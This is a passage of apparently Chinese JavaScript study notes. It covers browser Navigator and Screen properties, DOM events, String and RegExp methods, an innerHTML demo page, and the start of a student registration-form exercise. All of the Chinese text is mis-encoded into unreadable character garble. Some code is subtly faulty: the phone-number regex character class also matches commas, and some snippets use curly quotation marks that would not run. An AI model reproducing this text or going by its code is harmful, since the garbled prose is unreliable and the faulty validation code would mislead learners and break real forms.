[browserLanguage](https://www.w3school.com.cn/jsref/prop_nav_browserlanguage.asp) | è¿”å›å½“å‰æµè§ˆå™¨çš„è¯­è¨€ã€‚                         |\n| [cookieEnabled](https://www.w3school.com.cn/jsref/prop_nav_cookieenabled.asp) | è¿”å›æŒ‡æ˜æµè§ˆå™¨ä¸­æ˜¯å¦å¯ç”¨ cookie çš„å¸ƒå°”å€¼ã€‚     |\n| [cpuClass](https://www.w3school.com.cn/jsref/prop_nav_cpuclass.asp) | è¿”å›æµè§ˆå™¨ç³»ç»Ÿçš„ CPU ç­‰çº§ã€‚                    |\n| [onLine](https://www.w3school.com.cn/jsref/prop_nav_online.asp) | è¿”å›æŒ‡æ˜ç³»ç»Ÿæ˜¯å¦å¤„äºè„±æœºæ¨¡å¼çš„å¸ƒå°”å€¼ã€‚         |\n| [platform](https://www.w3school.com.cn/jsref/prop_nav_platform.asp) | è¿”å›è¿è¡Œæµè§ˆå™¨çš„æ“ä½œç³»ç»Ÿå¹³å°ã€‚                 |\n| [systemLanguage](https://www.w3school.com.cn/jsref/prop_nav_systemlanguage.asp) | è¿”å› OS ä½¿ç”¨çš„é»˜è®¤è¯­è¨€ã€‚                       |\n| [userAgent](https://www.w3school.com.cn/jsref/prop_nav_useragent.asp) | è¿”å›ç”±å®¢æˆ·æœºå‘é€æœåŠ¡å™¨çš„ user-agent å¤´éƒ¨çš„å€¼ã€‚ |\n| [userLanguage](https://www.w3school.com.cn/jsref/prop_nav_userlanguage.asp) | è¿”å› OS çš„è‡ªç„¶è¯­è¨€è®¾ç½®ã€‚                       |\n\n#### Navigator å¯¹è±¡æ–¹æ³•\n\n| æ–¹æ³•                                                         | æè¿°                                         |\n| :----------------------------------------------------------- | :------------------------------------------- |\n| [javaEnabled()](https://www.w3school.com.cn/jsref/met_nav_javaenabled.asp) | è§„å®šæµè§ˆå™¨æ˜¯å¦å¯ç”¨ Javaã€‚                    |\n| [taintEnabled()](https://www.w3school.com.cn/jsref/met_nav_taintenabled.asp) | è§„å®šæµè§ˆå™¨æ˜¯å¦å¯ç”¨æ•°æ®æ±¡ç‚¹ (data tainting)ã€‚ |\n\n### Screen å¯¹è±¡\n\n| å±æ€§                                                         | æè¿°                                         |\n| :----------------------------------------------------------- | :------------------------------------------- |\n| [availHeight](https://www.w3school.com.cn/jsref/prop_screen_availheight.asp) | è¿”å›æ˜¾ç¤ºå±å¹•çš„é«˜åº¦ (é™¤ Windows ä»»åŠ¡æ ä¹‹å¤–)ã€‚ |\n| [availWidth](https://www.w3school.com.cn/jsref/prop_screen_availwidth.asp) | è¿”å›æ˜¾ç¤ºå±å¹•çš„å®½åº¦ (é™¤ Windows ä»»åŠ¡æ ä¹‹å¤–)ã€‚ |\n| [bufferDepth](https://www.w3school.com.cn/jsref/prop_screen_bufferdepth.asp) | è®¾ç½®æˆ–è¿”å›è°ƒè‰²æ¿çš„æ¯”ç‰¹æ·±åº¦ã€‚                 |\n| [colorDepth](https://www.w3school.com.cn/jsref/prop_screen_colordepth.asp) | è¿”å›ç›®æ ‡è®¾å¤‡æˆ–ç¼“å†²å™¨ä¸Šçš„è°ƒè‰²æ¿çš„æ¯”ç‰¹æ·±åº¦ã€‚   |\n| [deviceXDPI](https://www.w3school.com.cn/jsref/prop_screen_devicexdpi.asp) | è¿”å›æ˜¾ç¤ºå±å¹•çš„æ¯è‹±å¯¸æ°´å¹³ç‚¹æ•°ã€‚               |\n| [deviceYDPI](https://www.w3school.com.cn/jsref/prop_screen_deviceydpi.asp) | è¿”å›æ˜¾ç¤ºå±å¹•çš„æ¯è‹±å¯¸å‚ç›´ç‚¹æ•°ã€‚               |\n| [fontSmoothingEnabled](https://www.w3school.com.cn/jsref/prop_screen_fontsmoothingenabled.asp) | è¿”å›ç”¨æˆ·æ˜¯å¦åœ¨æ˜¾ç¤ºæ§åˆ¶é¢æ¿ä¸­å¯ç”¨äº†å­—ä½“å¹³æ»‘ã€‚ |\n| [height](https://www.w3school.com.cn/jsref/prop_screen_height.asp) | è¿”å›æ˜¾ç¤ºå±å¹•çš„é«˜åº¦ã€‚                         |\n| [logicalXDPI](https://www.w3school.com.cn/jsref/prop_screen_logicalxdpi.asp) | è¿”å›æ˜¾ç¤ºå±å¹•æ¯è‹±å¯¸çš„æ°´å¹³æ–¹å‘çš„å¸¸è§„ç‚¹æ•°ã€‚     |\n| [logicalYDPI](https://www.w3school.com.cn/jsref/prop_screen_logicalydpi.asp) | è¿”å›æ˜¾ç¤ºå±å¹•æ¯è‹±å¯¸çš„å‚ç›´æ–¹å‘çš„å¸¸è§„ç‚¹æ•°ã€‚     |\n| [pixelDepth](https://www.w3school.com.cn/jsref/prop_screen_pixeldepth.asp) | è¿”å›æ˜¾ç¤ºå±å¹•çš„é¢œè‰²åˆ†è¾¨ç‡ï¼ˆæ¯”ç‰¹æ¯åƒç´ ï¼‰ã€‚     |\n| [updateInterval](https://www.w3school.com.cn/jsref/prop_screen_updateinterval.asp) | è®¾ç½®æˆ–è¿”å›å±å¹•çš„åˆ·æ–°ç‡ã€‚                     |\n| [width](https://www.w3school.com.cn/jsref/prop_screen_width.asp) | è¿”å›æ˜¾ç¤ºå™¨å±å¹•çš„å®½åº¦ã€‚                       |\n\n### DOM\n\n> **Document Object Model**ç®€ç§°DOMï¼Œé‡‡å–ç›´è§‚ã€ä¸€è‡´çš„æ–¹å¼å¯¹ç»“æ„åŒ–æ–‡æ¡£ï¼ˆHTMLã€XMLï¼‰è¿›è¡Œæ¨¡å‹åŒ–å¤„ç†ï¼Œå½¢æˆä¸€æ£µç»“æ„åŒ–çš„æ–‡æ¡£æ ‘ã€‚\n\nâ€‹\tæ¯ä¸ªHTMLæ–‡æ¡£è¢«åŠ è½½åéƒ½ä¼šåœ¨å†…å­˜ä¸­åˆå§‹åŒ–ä¸€ä¸ªdocumentå¯¹è±¡ï¼Œè¯¥å¯¹è±¡å­˜æ”¾æ•´ä¸ªç½‘é¡µHTMLå†…å®¹ï¼Œä»è¯¥å¯¹è±¡ä¸­å¯è·å–é¡µé¢ä»»ä½•å…ƒç´ ï¼ŒåŒ…æ‹¬è¡¨å•çš„å„ç§ä¿¡æ¯ã€‚\n\nâ€‹\tDOMä¸ºå¸¸ç”¨çš„HTMLå…ƒç´ æä¾›äº†ä¸€å¥—å®Œæ•´çš„æ¥å£/ç±»ä½“ç³»ã€‚ä»é¡µé¢çš„documentå¯¹è±¡åˆ°æ¯ä¸ªå¸¸ç”¨çš„HTMLå…ƒç´ ï¼ŒDOMæ¨¡å‹éƒ½æä¾›äº†å¯¹åº”çš„æ¥å£/ç±»ï¼Œæ¯ä¸ªæ¥å£/ç±»éƒ½æä¾›äº†ç›¸åº”çš„æ–¹æ³•æ¥æ“ä½œDOMå…ƒç´ æœ¬èº«ã€å±æ€§åŠå…¶å­å…ƒç´ ã€‚\n\n![](https://i.loli.net/2020/05/13/vdJHBsp53oIOtrf.png)\n\n### DOM Event å¯¹è±¡\n\n| å±æ€§                                                         | æ­¤äº‹ä»¶å‘ç”Ÿåœ¨ä½•æ—¶...                  |\n| :----------------------------------------------------------- | :----------------------------------- |\n| [onabort](https://www.w3school.com.cn/jsref/event_onabort.asp) | å›¾åƒçš„åŠ è½½è¢«ä¸­æ–­ã€‚                   |\n| [onblur](https://www.w3school.com.cn/jsref/event_onblur.asp) | å…ƒç´ å¤±å»ç„¦ç‚¹ã€‚                       |\n| [onchange](https://www.w3school.com.cn/jsref/event_onchange.asp) | å½“å…ƒç´ è·å–ç„¦ç‚¹ï¼Œä¸”å€¼å‘ç”Ÿæ”¹å˜æ—¶è§¦å‘ã€‚ |\n| [onclick](https://www.w3school.com.cn/jsref/event_onclick.asp) | å½“ç”¨æˆ·ç‚¹å‡»æŸä¸ªå¯¹è±¡æ—¶è°ƒç”¨çš„äº‹ä»¶å¥æŸ„ã€‚ |\n| [ondblclick](https://www.w3school.com.cn/jsref/event_ondblclick.asp) | å½“ç”¨æˆ·åŒå‡»æŸä¸ªå¯¹è±¡æ—¶è°ƒç”¨çš„äº‹ä»¶å¥æŸ„ã€‚ |\n| [onerror](https://www.w3school.com.cn/jsref/event_onerror.asp) | åœ¨åŠ è½½æ–‡æ¡£æˆ–å›¾åƒæ—¶å‘ç”Ÿé”™è¯¯ã€‚         |\n| [onfocus](https://www.w3school.com.cn/jsref/event_onfocus.asp) | å…ƒç´ è·å¾—ç„¦ç‚¹ã€‚                       |\n| [onkeydown](https://www.w3school.com.cn/jsref/event_onkeydown.asp) | æŸä¸ªé”®ç›˜æŒ‰é”®è¢«æŒ‰ä¸‹ã€‚                 |\n| [onkeypress](https://www.w3school.com.cn/jsref/event_onkeypress.asp) | æŸä¸ªé”®ç›˜æŒ‰é”®è¢«æŒ‰ä¸‹å¹¶æ¾å¼€ã€‚           |\n| [onkeyup](https://www.w3school.com.cn/jsref/event_onkeyup.asp) | æŸä¸ªé”®ç›˜æŒ‰é”®è¢«æ¾å¼€ã€‚                 |\n| [onload](https://www.w3school.com.cn/jsref/event_onload.asp) | ä¸€å¼ é¡µé¢æˆ–ä¸€å¹…å›¾åƒå®ŒæˆåŠ è½½ã€‚         |\n| [onmousedown](https://www.w3school.com.cn/jsref/event_onmousedown.asp) | é¼ æ ‡æŒ‰é’®è¢«æŒ‰ä¸‹ã€‚                     |\n| [onmousemove](https://www.w3school.com.cn/jsref/event_onmousemove.asp) | é¼ æ ‡è¢«ç§»åŠ¨ã€‚                         |\n| [onmouseout](https://www.w3school.com.cn/jsref/event_onmouseout.asp) | é¼ æ ‡ä»æŸå…ƒç´ ç§»å¼€ã€‚                   |\n| [onmouseover](https://www.w3school.com.cn/jsref/event_onmouseover.asp) | é¼ æ ‡ç§»åˆ°æŸå…ƒç´ ä¹‹ä¸Šã€‚                 |\n| [onmouseup](https://www.w3school.com.cn/jsref/event_onmouseup.asp) | é¼ æ ‡æŒ‰é”®è¢«æ¾å¼€ã€‚                     |\n| [onreset](https://www.w3school.com.cn/jsref/event_onreset.asp) | é‡ç½®æŒ‰é’®è¢«ç‚¹å‡»ã€‚                     |\n| [onresize](https://www.w3school.com.cn/jsref/event_onresize.asp) | çª—å£æˆ–æ¡†æ¶è¢«é‡æ–°è°ƒæ•´å¤§å°ã€‚           |\n| [onselect](https://www.w3school.com.cn/jsref/event_onselect.asp) | æ–‡æœ¬è¢«é€‰ä¸­ã€‚                         |\n| [onsubmit](https://www.w3school.com.cn/jsref/event_onsubmit.asp) | ç¡®è®¤æŒ‰é’®è¢«ç‚¹å‡»ã€‚                     |\n| [onunload](https://www.w3school.com.cn/jsref/event_onunload.asp) | ç”¨æˆ·é€€å‡ºé¡µé¢ã€‚                       |\n\n### JavaScript String å¯¹è±¡\n\n| æ–¹æ³•                                                         | æè¿°                                                 |\n| :----------------------------------------------------------- | :--------------------------------------------------- |\n| [anchor()](https://www.w3school.com.cn/jsref/jsref_anchor.asp) | åˆ›å»º HTML é”šã€‚                                       |\n| [big()](https://www.w3school.com.cn/jsref/jsref_big.asp)     | ç”¨å¤§å·å­—ä½“æ˜¾ç¤ºå­—ç¬¦ä¸²ã€‚                               |\n| [blink()](https://www.w3school.com.cn/jsref/jsref_blink.asp) | æ˜¾ç¤ºé—ªåŠ¨å­—ç¬¦ä¸²ã€‚                                     |\n| [bold()](https://www.w3school.com.cn/jsref/jsref_bold.asp)   | ä½¿ç”¨ç²—ä½“æ˜¾ç¤ºå­—ç¬¦ä¸²ã€‚                                 |\n| [charAt()](https://www.w3school.com.cn/jsref/jsref_charAt.asp) | è¿”å›åœ¨æŒ‡å®šä½ç½®çš„å­—ç¬¦ã€‚                               |\n| [charCodeAt()](https://www.w3school.com.cn/jsref/jsref_charCodeAt.asp) | è¿”å›åœ¨æŒ‡å®šçš„ä½ç½®çš„å­—ç¬¦çš„ Unicode ç¼–ç ã€‚              |\n| [concat()](https://www.w3school.com.cn/jsref/jsref_concat_string.asp) | è¿æ¥å­—ç¬¦ä¸²ã€‚                                         |\n| [fixed()](https://www.w3school.com.cn/jsref/jsref_fixed.asp) | ä»¥æ‰“å­—æœºæ–‡æœ¬æ˜¾ç¤ºå­—ç¬¦ä¸²ã€‚                             |\n| [fontcolor()](https://www.w3school.com.cn/jsref/jsref_fontcolor.asp) | ä½¿ç”¨æŒ‡å®šçš„é¢œè‰²æ¥æ˜¾ç¤ºå­—ç¬¦ä¸²ã€‚                         |\n| [fontsize()](https://www.w3school.com.cn/jsref/jsref_fontsize.asp) | ä½¿ç”¨æŒ‡å®šçš„å°ºå¯¸æ¥æ˜¾ç¤ºå­—ç¬¦ä¸²ã€‚                         |\n| [fromCharCode()](https://www.w3school.com.cn/jsref/jsref_fromCharCode.asp) | ä»å­—ç¬¦ç¼–ç åˆ›å»ºä¸€ä¸ªå­—ç¬¦ä¸²ã€‚                           |\n| [indexOf()](https://www.w3school.com.cn/jsref/jsref_indexOf.asp) | æ£€ç´¢å­—ç¬¦ä¸²ã€‚                                         |\n| [italics()](https://www.w3school.com.cn/jsref/jsref_italics.asp) | ä½¿ç”¨æ–œä½“æ˜¾ç¤ºå­—ç¬¦ä¸²ã€‚                                 |\n| [lastIndexOf()](https://www.w3school.com.cn/jsref/jsref_lastIndexOf.asp) | ä»åå‘å‰æœç´¢å­—ç¬¦ä¸²ã€‚                                 |\n| [link()](https://www.w3school.com.cn/jsref/jsref_link.asp)   | å°†å­—ç¬¦ä¸²æ˜¾ç¤ºä¸ºé“¾æ¥ã€‚                                 |\n| [localeCompare()](https://www.w3school.com.cn/jsref/jsref_localeCompare.asp) | ç”¨æœ¬åœ°ç‰¹å®šçš„é¡ºåºæ¥æ¯”è¾ƒä¸¤ä¸ªå­—ç¬¦ä¸²ã€‚                   |\n| [match()](https://www.w3school.com.cn/jsref/jsref_match.asp) | æ‰¾åˆ°ä¸€ä¸ªæˆ–å¤šä¸ªæ­£åˆ™è¡¨è¾¾å¼çš„åŒ¹é…ã€‚                     |\n| [replace()](https://www.w3school.com.cn/jsref/jsref_replace.asp) | æ›¿æ¢ä¸æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…çš„å­ä¸²ã€‚                         |\n| [search()](https://www.w3school.com.cn/jsref/jsref_search.asp) | æ£€ç´¢ä¸æ­£åˆ™è¡¨è¾¾å¼ç›¸åŒ¹é…çš„å€¼ã€‚                         |\n| [slice()](https://www.w3school.com.cn/jsref/jsref_slice_string.asp) | æå–å­—ç¬¦ä¸²çš„ç‰‡æ–­ï¼Œå¹¶åœ¨æ–°çš„å­—ç¬¦ä¸²ä¸­è¿”å›è¢«æå–çš„éƒ¨åˆ†ã€‚ |\n| [small()](https://www.w3school.com.cn/jsref/jsref_small.asp) | ä½¿ç”¨å°å­—å·æ¥æ˜¾ç¤ºå­—ç¬¦ä¸²ã€‚                             |\n| [split()](https://www.w3school.com.cn/jsref/jsref_split.asp) | æŠŠå­—ç¬¦ä¸²åˆ†å‰²ä¸ºå­—ç¬¦ä¸²æ•°ç»„ã€‚                           |\n| [strike()](https://www.w3school.com.cn/jsref/jsref_strike.asp) | ä½¿ç”¨åˆ é™¤çº¿æ¥æ˜¾ç¤ºå­—ç¬¦ä¸²ã€‚                             |\n| [sub()](https://www.w3school.com.cn/jsref/jsref_sub.asp)     | æŠŠå­—ç¬¦ä¸²æ˜¾ç¤ºä¸ºä¸‹æ ‡ã€‚                                 |\n| [substr()](https://www.w3school.com.cn/jsref/jsref_substr.asp) | ä»èµ·å§‹ç´¢å¼•å·æå–å­—ç¬¦ä¸²ä¸­æŒ‡å®šæ•°ç›®çš„å­—ç¬¦ã€‚             |\n| [substring()](https://www.w3school.com.cn/jsref/jsref_substring.asp) | æå–å­—ç¬¦ä¸²ä¸­ä¸¤ä¸ªæŒ‡å®šçš„ç´¢å¼•å·ä¹‹é—´çš„å­—ç¬¦ã€‚             |\n| [sup()](https://www.w3school.com.cn/jsref/jsref_sup.asp)     | æŠŠå­—ç¬¦ä¸²æ˜¾ç¤ºä¸ºä¸Šæ ‡ã€‚                                 |\n| [toLocaleLowerCase()](https://www.w3school.com.cn/jsref/jsref_toLocaleLowerCase.asp) | æŠŠå­—ç¬¦ä¸²è½¬æ¢ä¸ºå°å†™ã€‚                                 |\n| [toLocaleUpperCase()](https://www.w3school.com.cn/jsref/jsref_toLocaleUpperCase.asp) | æŠŠå­—ç¬¦ä¸²è½¬æ¢ä¸ºå¤§å†™ã€‚                                 |\n| [toLowerCase()](https://www.w3school.com.cn/jsref/jsref_toLowerCase.asp) | æŠŠå­—ç¬¦ä¸²è½¬æ¢ä¸ºå°å†™ã€‚                                 |\n| [toUpperCase()](https://www.w3school.com.cn/jsref/jsref_toUpperCase.asp) | æŠŠå­—ç¬¦ä¸²è½¬æ¢ä¸ºå¤§å†™ã€‚                                 |\n| toSource()                                                   | ä»£è¡¨å¯¹è±¡çš„æºä»£ç ã€‚                                   |\n| [toString()](https://www.w3school.com.cn/jsref/jsref_toString_string.asp) | è¿”å›å­—ç¬¦ä¸²ã€‚                                         |\n| trim()                                                       | å»é™¤å­—ç¬¦ä¸²ä¸¤è¾¹çš„ç©ºç©ºæ ¼                               |\n| [valueOf()](https://www.w3school.com.cn/jsref/jsref_valueOf_string.asp) | è¿”å›æŸä¸ªå­—ç¬¦ä¸²å¯¹è±¡çš„åŸå§‹å€¼ã€‚                         |\n\nindexOf() æ–¹æ³•å¯è¿”å›æŸä¸ªæŒ‡å®šçš„å­—ç¬¦ä¸²å€¼åœ¨å­—ç¬¦ä¸²ä¸­é¦–æ¬¡å‡ºç°çš„ä½ç½®ã€‚\n\nlastIndexOf() æ–¹æ³•å¯è¿”å›ä¸€ä¸ªæŒ‡å®šçš„å­—ç¬¦ä¸²å€¼æœ€åå‡ºç°çš„ä½ç½®ï¼Œåœ¨ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­çš„æŒ‡å®šä½ç½®ä»åå‘å‰æœç´¢ã€‚\n\ntrim() æ–¹æ³•ç”¨äºåˆ é™¤å­—ç¬¦ä¸²çš„å¤´å°¾ç©ºæ ¼ã€‚\n\n### JavaScript RegExp å¯¹è±¡\n\n| æ–¹æ³•                                                         | æè¿°                                               |\n| :----------------------------------------------------------- | :------------------------------------------------- |\n| [compile](https://www.w3school.com.cn/jsref/jsref_regexp_compile.asp) | ç¼–è¯‘æ­£åˆ™è¡¨è¾¾å¼ã€‚                                   |\n| [exec](https://www.w3school.com.cn/jsref/jsref_exec_regexp.asp) | æ£€ç´¢å­—ç¬¦ä¸²ä¸­æŒ‡å®šçš„å€¼ã€‚è¿”å›æ‰¾åˆ°çš„å€¼ï¼Œå¹¶ç¡®å®šå…¶ä½ç½®ã€‚ |\n| [test](https://www.w3school.com.cn/jsref/jsref_test_regexp.asp) | æ£€ç´¢å­—ç¬¦ä¸²ä¸­æŒ‡å®šçš„å€¼ã€‚è¿”å› true æˆ– falseã€‚         |\n\ntest() æ–¹æ³•ç”¨äºæ£€æµ‹ä¸€ä¸ªå­—ç¬¦ä¸²æ˜¯å¦åŒ¹é…æŸä¸ªæ¨¡å¼.\n\n```\nRegExpObject.test(string)\n```\n\n```javascript\nif(!(/^[1][3,4,5,7,8][0-9]{9}$/).test(tel))\n\t\talert(\"æ‰‹æœºå·æ ¼å¼é”™è¯¯ï¼\");\n\nif(!(/^[1][3,4,5,7,8]\\d{9}$/).test(tel))\n\t\talert(\"æ‰‹æœºå·æ ¼å¼é”™è¯¯ï¼\");\n```\n\nè¡¨è¾¾å¼çš„æ„æ€æ˜¯ï¼š\n\n1--ä»¥1ä¸ºå¼€å¤´ï¼›\n\n2--ç¬¬äºŒä½å¯ä¸º3,4,5,7,8,ä¸­çš„ä»»æ„ä¸€ä½ï¼›\n\n3--[0-9]çš„æ•° \\dä»£è¡¨æ•°å­—\n\n4--9æ¬¡[0-9]\n\n### è·å¾—HTMLå…ƒç´ èŠ‚ç‚¹\n\n>  ä¸ºåŠ¨æ€åœ°ä¿®æ”¹HTMLé¡µé¢ï¼Œé¦–å…ˆéœ€è¦è·å¾—HTMLå…ƒç´ å¯¹è±¡ã€‚\n\nâ€¢é€šè¿‡HTMLæ ‡ç­¾çš„idå±æ€§ï¼š\n\n```javascript\n  var xEle=document.getElementById(â€œxElementâ€);\n   æ²¡æœ‰åˆ™è¿”å›null\n```\n\nâ€¢é€šè¿‡è¡¨å•çš„nameå±æ€§ï¼š\n\n```javascript\n  var nodeinp=document.form[0].user_name;\n```\n\nâ€¢é€šè¿‡CSSé€‰æ‹©å™¨ï¼š\n\n```javascript\nvar node=document.querySelector(â€œ#myColor_1â€);\n   //è¿”å›ä¸€ä¸ªnodeèŠ‚ç‚¹\n```\n\n### ä¿®æ”¹HTMLå…ƒç´ \n\n> åŒ…æ‹¬ä¿®æ”¹èŠ‚ç‚¹çš„å†…å®¹ã€å±æ€§å’ŒCSSæ ·å¼\n\n| **å±æ€§**           | **è¯´æ˜**                                   |\n| ------------------ | ------------------------------------------ |\n| **innerHTML**      | è®¾ç½®æˆ–è·å–ä½äºå¯¹è±¡èµ·å§‹å’Œç»“æŸæ ‡ç­¾å†…çš„ HTML  |\n| **outerHTML**      | è®¾ç½®æˆ–è·å–å¯¹è±¡åŠå…¶å†…å®¹çš„ HTML å½¢å¼         |\n| **innerText**      | è®¾ç½®æˆ–è·å–ä½äºå¯¹è±¡èµ·å§‹å’Œç»“æŸæ ‡ç­¾å†…çš„æ–‡æœ¬   |\n| **outerText**      | è®¾ç½®(åŒ…æ‹¬æ ‡ç­¾)æˆ–è·å–(ä¸åŒ…æ‹¬æ ‡ç­¾)å¯¹è±¡çš„æ–‡æœ¬ |\n| **value**          | è®¾ç½®æˆ–è·å–è¡¨å•å…ƒç´ çš„valueå±æ€§å€¼            |\n| **options[index]** | è®¾ç½®æˆ–è·å–è¡¨å•ä¸­åˆ—è¡¨ã€ä¸‹æ‹‰èœå•çš„é€‰é¡¹å†…å®¹   |\n| **className**      | ä¿®æ”¹HTMLå…ƒç´ çš„CSSæ ·å¼                      |\n| **style**          | ä¿®æ”¹HTMLå…ƒç´ çš„å†…è”CSSæ ·å¼                  |\n\n#### ä¿®æ”¹HTMLå…ƒç´ --å†…å®¹\n\n![](https://i.loli.net/2020/05/13/r2cIvX6stAOU7Le.png)\n\n\n\n```html\n<!doctype html>\n<html>\n<head>\n<meta charset=\"utf-8\">\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">  \n<title>innerHTMLã€outerHTMLå’ŒinnerTextã€outerHTMLçš„åŒºåˆ«</title>  \n   \n</head>   \n<body>   \n\tã€€<ul>   \n    ã€€ã€€<li id=\"test_id1\" onclick=\"innerHTMLDemo()\">innerHTMLæ•ˆæœ.</li>   \n\tã€€ã€€<li id=\"test_id2\" onclick=\"innerTextDemo()\">innerTextæ•ˆæœ.</li>   \n\tã€€ã€€<li id=\"test_id3\" onclick=\"outerHTMLDemo()\">outerHTMLæ•ˆæœ.</li>   \n\tã€€ã€€<li id=\"test_id4\" onclick=\"outerTextDemo()\">outerTextæ•ˆæœ.</li>   \n\tã€€</ul>  \n\t\n\t<script language=\"JavaScript\" type=\"text/javascript\">   \nã€€ã€€//.innerHTML  \nã€€ã€€function innerHTMLDemo()  \nã€€ã€€{   \nã€€ã€€ã€€test_id1.innerHTML=\"<i><u>è®¾ç½®æˆ–è·å–ä½äºå¯¹è±¡èµ·å§‹å’Œç»“æŸæ ‡ç­¾å†…çš„ HTML.</u></i>\";   \nã€€ã€€}   \n\tã€€ã€€//.innerText  \nã€€ã€€function innerTextDemo()  \nã€€ã€€{   \nã€€ã€€ã€€test_id2.innerText=\"<i><u>è®¾ç½®æˆ–è·å–ä½äºå¯¹è±¡èµ·å§‹å’Œç»“æŸæ ‡ç­¾å†…çš„æ–‡æœ¬.</u></i>\";   \nã€€ã€€}   \n\tã€€ã€€//.outerHTML  \nã€€ã€€function outerHTMLDemo()  \nã€€ã€€{   \n\tã€€ã€€ã€€test_id3.outerHTML=\"<font size=9pt color=red><i><u>è®¾ç½®æˆ–è·å–å¯¹è±¡åŠå…¶å†…å®¹çš„ HTML å½¢å¼.</u></i></font>\";   \nã€€ã€€}  \n\tã€€ã€€//.outerText  \nã€€ã€€function outerTextDemo()  \n  ã€€{   \nã€€ã€€ã€€test_id4.outerText=\"<br></br><i><u>è®¾ç½®(åŒ…æ‹¬æ ‡ç­¾)æˆ–è·å–(ä¸åŒ…æ‹¬æ ‡ç­¾)å¯¹è±¡çš„æ–‡æœ¬.</u></i>\";   \nã€€ã€€}  \nã€€</script>    \n</body>   \n</html>  \n```\n\n## JavaScriptå®ä¾‹ç»ƒä¹ \n\n### ç›®çš„\n\n- æŒæ¡JavaScriptè„šæœ¬çš„è°ƒç”¨å’ŒåŸºæœ¬è¯­æ³•ï¼›\n- æŒæ¡JavaScriptå¸¸ç”¨å†…ç½®å¯¹è±¡çš„åŸºæœ¬åº”ç”¨ï¼›\n\n- æŒæ¡BOMå’Œwindowæ¶ˆæ¯å¯¹è¯æ¡†çš„ä½¿ç”¨ï¼›\n\n- æŒæ¡HTML DOMåŠ¨æ€ç½‘é¡µè®¾è®¡æŠ€æœ¯ã€‚ \n\n### é¢˜ç›®\n\n**ä¸ºRegister.htmlç¼–å†™JavaScriptè„šæœ¬æ–‡ä»¶ï¼Œé‡‡ç”¨é“¾æ¥æ–¹å¼è°ƒç”¨ï¼Œå®ç°å¦‚ä¸‹åŠŸèƒ½ï¼š**\n\n> (1)\tå½“ç”¨æˆ·å¡«å†™éç©ºç™½ç”¨æˆ·åã€å­¦å·å’Œå¯†ç åï¼Œå°†è¾“å…¥åŸŸåçš„æ˜Ÿå·å˜ä¸ºç°è‰²ï¼Œå½“ç”¨æˆ·æ¸…é™¤è¾“å…¥åŸŸæ—¶ï¼Œå°†æ˜Ÿå·å˜ä¸ºç°è‰²ï¼Œè§å›¾1ï¼›\n> (2)\tå½“ç”¨æˆ·å•å‡»â€œæ³¨å†Œâ€æŒ‰é’®æ—¶ï¼Œè¯»å–ç”¨æˆ·çš„å§“åã€å­¦å·ã€æ€§åˆ«ã€ä½å€å’Œçˆ±å¥½ä¿¡æ¯ï¼Œç„¶åä½¿ç”¨ç¡®è®¤æ¶ˆæ¯å¯¹è¯æ¡†æ˜¾ç¤ºè¿™äº›ä¿¡æ¯ï¼Œå¹¶æç¤ºç”¨æˆ·æ˜¯å¦ç»§ç»­æäº¤ï¼Œè§å›¾2ï¼›\n> å¦‚æœç»§ç»­ï¼Œåˆ™å¯¹è¡¨å•æ•°æ®åšå¦‚ä¸‹æ£€éªŒã€å¤„ç†å’Œæç¤ºï¼ˆè§å›¾3ï¼‰ï¼š\n> (3)\tæ£€éªŒç”¨æˆ·åä¸èƒ½ä¸ºç©ºï¼Œæ¸…é™¤ç”¨æˆ·åä¸¤ç«¯å¤šä½™ç©ºæ ¼ï¼Œæœ€åå‘æœåŠ¡å™¨æäº¤å»æ‰ç©ºæ ¼åçš„ç”¨æˆ·åï¼›\n> (4)\tå¯†ç å¿…é¡»ä¸º8ä½ï¼Œä¸”ä¸¤æ¬¡è¾“å…¥å¯†ç ç›¸åŒï¼›\n> (5)\tç”µè¯å·ç å¿…é¡»ä½11ä½æ•°å­—ï¼›\n> (6)\té‚®ä»¶åœ°å€ä¸­å¿…é¡»åŒ…å«ä¸”åªåŒ…å«ä¸€ä¸ªâ€œ@â€ç¬¦å·ï¼Œå¹¶ä¸”â€œ@â€ä¸èƒ½æ˜¯åœ°å€ç¬¬ä¸€å’Œæœ€åä¸€ä¸ªå­—ç¬¦ã€‚\n\n| æ•ˆæœå›¾                                                  | æ•ˆæœå›¾                                                       |\n| ------------------------------------------------------- | ------------------------------------------------------------ |\n| ![å›¾1](https://img.jwt1399.top//img/20200811155651.jpg) | ![å›¾2](https://img.jwt1399.top//img/20200811155645.png)![å›¾3](https://img.jwt1399.top//img/20200811155622.png) |\n| ![å›¾3](https://img.jwt1399.top//img/20200811155629.png) | ![å›¾3](https://img.jwt1399.top//img/20200811155625.png)      |\n\n### è§£ç­”\n\n#### Register.html\n\n```html\n<!doctype html>\n<html>\n\t<head>\n\t<meta charset=\"utf-8\">\n\t<title>æ–°ç”ŸæŠ¥åˆ°</title>\n\t<link href=\"style/Register.css\" rel=\"stylesheet\" type=\"text/css\">\n\t<script src=\"js/Register.js\"></script>\n\t</head>\n\t<body>\n\t<div id=\"wrapper\">\n\t\t<h3 id=\"title\" align=\"center\">æ³¨ å†Œ ä¿¡ æ¯</h3>\n\t\t<hr noshade size=\"1\" width=\"99%\">\n\t\t<form action=\"\" name=\"regForm\" id=\"regForm\" autocomplete=\"on\" method=\"get\">\n\t\t\t<div class=\"info-item\"><span class=\"item-name\">å§“åï¼š</span>  \n\t\t\t\t<input type=\"text\" class=\"item-inp\" name=\"user_name\" maxlength=\"10\" autofocus required onChange=\"changeStatus(this)\"/><span class=\"star\"> *</span>\n\t\t\t</div>\n\n\t\t\t<div class=\"info-item\"><span class=\"item-name\">å­¦å·ï¼š</span>  \n\t\t\t\t<input type=\"text\" class=\"item-inp\" name=\"user_id\" required onChange=\"changeStatus(this)\"/><span class=\"star\"> *</span>\n\t\t\t</div>\t\n\t\t\t\n\t\t\t<div class=\"info-item\"><span class=\"item-name\">å¯†ç ï¼š</span> \n\t\t\t\t<input type=\"password\" class=\"item-inp\" name=\"user_pwd1\"  placeholder=\"è¯·è¾“å…¥8ä½å¯†ç \" required onChange=\"changeStatus(this)\"/><span class=\"star\"> *</span>\n\t\t\t</div>\n\t\t\t\n\t\t\t<div class=\"info-item\"><span class=\"item-name\">ç¡®è®¤å¯†ç ï¼š</span> \n\t\t\t\t<input type=\"password\" class=\"item-inp\" name=\"user_pwd2\"  placeholder=\"è¯·è¾“å…¥ç›¸åŒçš„å¯†ç \" required 